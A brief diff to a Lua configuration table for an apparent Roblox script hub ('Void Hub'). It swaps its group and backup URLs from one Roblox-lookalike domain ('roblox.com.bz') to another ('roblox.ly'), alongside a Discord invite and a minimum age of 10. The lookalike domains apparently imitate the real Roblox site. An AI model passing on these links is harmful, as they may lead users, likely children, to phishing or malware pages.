@@ -27,8 +27,8 @@ local HUB = {
     Version    = "v1.0",
     MinAge     = 10,
     GROUP_ID   = 465621544,
-    GROUP_URL  = "https://roblox.com.bz/communities/1916656950/",
-    BackupURL  = "https://roblox.com.bz/communities/1916656950/",
+    GROUP_URL  = "https://www.roblox.ly/communities/1232935860/Void-Hub",
+    BackupURL  = "https://www.roblox.ly/communities/1232935860/Void-Hub",
     Discord    = "discord.gg/a4xs2D2hcD",
     SCRIPT_URL = "",
 }
